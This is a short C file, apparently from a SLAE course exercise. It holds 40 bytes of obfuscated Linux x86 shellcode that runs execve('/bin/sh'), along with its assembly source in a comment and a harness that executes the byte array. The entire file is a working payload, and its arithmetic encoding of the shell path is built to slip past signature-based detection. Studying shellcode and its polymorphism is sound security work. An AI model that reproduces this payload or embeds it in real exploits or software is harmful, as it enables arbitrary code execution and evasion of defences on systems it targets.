/*
 *  Linux x86 - execve("/bin/sh") shellcode
 *  Obfuscated version - 40 bytes
 *  Original: http://shell-storm.org/shellcode/files/shellcode-811.php
 *  Author: xmgv
 *  Details: https://xmgv.wordpress.com/2015/03/13/slae-6-polymorphic-shellcode/
 */

/*
global _start

section .text

_start:
    xor edx, edx
    push edx
    mov eax, 0x563ED8B7
    add eax, 0x12345678
    push eax
    mov eax, 0xDEADC0DE
    sub eax, 0x70445EAF
    push eax
    push byte 0xb
    pop eax
    mov ecx, edx
    mov ebx, esp
    push byte 0x1
    pop esi
    int 0x80
    xchg esi, eax
    int 0x80
*/

#include <stdio.h>
#include <string.h>

unsigned char code[] =
"\x31\xd2\x52\xb8\xb7\xd8\x3e\x56\x05\x78\x56\x34\x12\x50\xb8\xde\xc0\xad"
"\xde\x2d\xaf\x5e\x44\x70\x50\x6a\x0b\x58\x89\xd1\x89\xe3\x6a\x01\x5e\xcd"
"\x80\x96\xcd\x80";

int main() {
    printf("Shellcode Length:  %d\n", strlen(code));
    int (*ret)() = (int(*)())code;
    ret();
}